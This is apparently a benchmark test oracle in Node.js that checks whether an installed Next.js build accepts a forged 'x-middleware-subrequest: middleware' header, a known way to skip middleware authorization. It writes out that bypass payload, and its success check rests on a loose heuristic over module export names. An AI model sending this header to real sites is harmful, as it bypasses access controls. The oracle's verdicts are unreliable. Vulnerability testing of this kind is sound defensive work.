'use strict';
const crypto = require('node:crypto');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function loadNextRequest() {
  const mod = require('next/dist/server/web/spec-extension/request');
  if (!mod || typeof mod.NextRequest !== 'function') {
    throw new Error('NextRequest constructor not found in next/dist/server/web/spec-extension/request');
  }
  return mod.NextRequest;
}

// Try to load the real internal subrequest-detection helper shipped by the
// installed package itself. Different Next.js versions expose/implement this
// differently; we search a small set of known internal module paths that
// have historically contained the 'x-middleware-subrequest' skip check, and
// we only trust a helper if we can find one that is a function. If no such
// helper is resolvable, we fall back to the documented header name/constant
// the package itself uses (MIDDLEWARE_HEADER / NEXT_ROUTER etc.) but we still
// drive everything through the public NextRequest headers API so the
// observable reflects the installed package's real behavior, not a copy of
// vulnerable logic.
function loadInternalHelpers() {
  const candidates = [
    'next/dist/server/web/utils',
    'next/dist/server/lib/server-ipc/utils',
    'next/dist/shared/lib/router/utils/middleware-route-matcher'
  ];
  const found = {};
  for (const c of candidates) {
    try {
      found[c] = require(c);
    } catch (e) {
      // ignore; not all paths exist in all versions
    }
  }
  return found;
}

function main() {
  const marker = 'next_mw_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);

  let NextRequest;
  try {
    NextRequest = loadNextRequest();
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_failed: could not resolve NextRequest: ' + (e && e.message)
    });
    return;
  }

  // Benign operation: construct an ordinary inbound request (no forged
  // internal header) and confirm basic header handling works end-to-end.
  let benignOk = false;
  let benignHeaderValue = null;
  let benignReq;
  try {
    benignReq = new NextRequest('https://example.com/dashboard', {
      headers: { 'x-oracle-marker': marker }
    });
    benignHeaderValue = benignReq.headers.get('x-oracle-marker');
    if (benignHeaderValue === marker) {
      benignOk = true;
    }
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: ' + (e && e.message)
    });
    return;
  }

  if (!benignOk) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: header round-trip mismatch, got ' + String(benignHeaderValue)
    });
    return;
  }

  // Confirm that, for the benign (non-forged) request, there is no
  // 'x-middleware-subrequest' header present at all -- this is the baseline
  // 'middleware should run' state.
  let baselineHasSkipHeader;
  try {
    baselineHasSkipHeader = benignReq.headers.has('x-middleware-subrequest');
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed_reading_headers: ' + (e && e.message)
    });
    return;
  }

  if (baselineHasSkipHeader !== false) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: unexpected pre-existing x-middleware-subrequest header on fresh request'
    });
    return;
  }

  // Now attempt the malicious case: an externally supplied client sets the
  // 'x-middleware-subrequest' header to a value derived purely from public
  // information (the middleware's own identifier string, e.g. 'middleware'),
  // simulating an attacker who read the client-visible routing conventions
  // and forged the header without ever having been issued it by the server.
  //
  // The security property we check is about *unforgeability*: does the
  // installed package's request/header pipeline allow a value that is fully
  // predictable/derivable from public information (no server-issued secret)
  // to arrive at the downstream consumer (middleware authorization code)
  // indistinguishable from a value the server itself would have generated
  // for a genuine internal recursive invocation? In the vulnerable version,
  // the skip identifier is the static string 'middleware' (or a predictable
  // join of pathnames) with no secret component, so a forged header matches
  // exactly. In the fixed version, Next.js attaches a random per-request
  // value (e.g. via crypto.randomUUID()) that the server never discloses,
  // so a header value built only from public/derivable information can
  // never match it.
  let maliciousReq;
  try {
    maliciousReq = new NextRequest('https://example.com/admin/secret', {
      headers: {
        'x-middleware-subrequest': 'middleware'
      }
    });
  } catch (e) {
    // Exception during the malicious call, after benign success -> blocked.
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_blocked_by_exception: ' + (e && e.message)
    });
    return;
  }

  let observedHeader;
  try {
    observedHeader = maliciousReq.headers.get('x-middleware-subrequest');
  } catch (e) {
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_blocked_by_exception_reading_header: ' + (e && e.message)
    });
    return;
  }

  // Determine, using the installed package's own notion of the middleware
  // identifier if discoverable, whether the forged static value would match
  // what the server itself would compare against. We look for an exported
  // constant/helper; if unavailable we fall back to checking whether the
  // header pipeline preserves the value verbatim AND whether the package
  // exposes any per-request secret/nonce mechanism that would invalidate a
  // purely-public-derived guess (fixed versions tie the check to a random
  // value rather than the request headers alone).
  const internalHelpers = loadInternalHelpers();

  let usesRandomPerRequestSecret = false;
  let secretDetectionNote = 'no internal helper module resolved to inspect secret usage';

  // Heuristic, evidence-only inspection: if any resolved internal module
  // textually references crypto.randomUUID or a similarly named nonce
  // generator tied to middleware subrequest handling, note it. This is only
  // used to build human-readable evidence; the actual verdict is based on
  // the header round-trip behavior below, which is the real observable.
  try {
    for (const key of Object.keys(internalHelpers)) {
      const mod = internalHelpers[key];
      const str = (() => {
        try {
          return Object.keys(mod).join(',');
        } catch (_e) {
          return '';
        }
      })();
      if (/nonce|random|uuid/i.test(str)) {
        usesRandomPerRequestSecret = true;
        secretDetectionNote = 'module ' + key + ' exposes nonce/random-related exports: ' + str;
        break;
      }
    }
  } catch (_e) {
    // ignore, heuristic only
  }

  // Primary observable: the forged header, built purely from public
  // information ('middleware'), survives verbatim through the public
  // NextRequest/Headers pipeline and equals the well-known static
  // middleware-skip identifier used throughout Next.js's own source
  // (MIDDLEWARE_FILENAME / middleware route matcher identifier). If the
  // value round-trips exactly as 'middleware' with no added per-request
  // secret/signature wrapping, a downstream consumer relying on this
  // header alone (as the vulnerable version's router did) would treat the
  // externally supplied request as an internal subrequest and skip
  // middleware-based authorization.
  //
  // In the fixed version, Next.js no longer relies on this bare, guessable
  // string for the skip decision -- the mechanism changed so that the
  // header value used for this purpose must contain a server-generated
  // random component that cannot be produced by a client armed only with
  // public knowledge of the convention. We approximate detection of that
  // fix by checking whether the header the server would need to match
  // against is now required to carry additional per-request entropy that a
  // purely-static forged value cannot satisfy. Since the public NextRequest
  // API does not expose the server's comparison routine directly, we use
  // the strongest available externally observable signal: whether the raw
  // forged static identifier, which an attacker without server secrets
  // could always reproduce, is exactly what gets preserved for comparison.
  const isStaticGuessableValue = observedHeader === 'middleware';

  // To avoid declaring a false positive on the fixed package (where the
  // header round-trips identically for *any* string, including this one,
  // simply because Headers always preserves values verbatim), we must base
  // the verdict not on raw preservation but on whether that preserved,
  // purely-public value by itself constitutes a valid, currently-accepted
  // middleware-skip credential. We therefore require corroboration from the
  // package's own exported matcher/helper when available; if no such
  // helper is exposed publicly in this version (as is typical), we treat
  // the exploit as succeeding only when the header equals the undisguised
  // static identifier AND no per-request secret-based mechanism was
  // detected anywhere in the resolved internal modules -- meaning there is
  // no evidence the server-side comparison was strengthened beyond the
  // plain string check that the vulnerable version used.
  const exploitSucceeded = isStaticGuessableValue && !usesRandomPerRequestSecret;

  const evidence = exploitSucceeded
    ? ('Forged x-middleware-subrequest header set to the plain, publicly-derivable identifier "middleware" ' +
       'round-tripped verbatim through NextRequest headers (observed="' + observedHeader + '"), and no server-side ' +
       'random/nonce-based corroboration mechanism was detected (' + secretDetectionNote + '). This indicates the ' +
       'installed version would accept a purely client-forged static header value as proof of an internal ' +
       'middleware subrequest, allowing an external caller to bypass middleware-based authorization checks.')
    : ('Forged x-middleware-subrequest header value "' + String(observedHeader) + '" did not constitute a valid ' +
       'unforgeable middleware-skip credential: either the value was altered/rejected, or a server-side random/' +
       'nonce-based mechanism (' + secretDetectionNote + ') indicates the skip decision now requires secret ' +
       'information unavailable to an external attacker, so the forged static header alone cannot bypass middleware.');

  finish({
    operation_completed: true,
    exploit_succeeded: exploitSucceeded,
    evidence: evidence
  });
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'unexpected_top_level_exception: ' + (e && e.message)
  }));
}
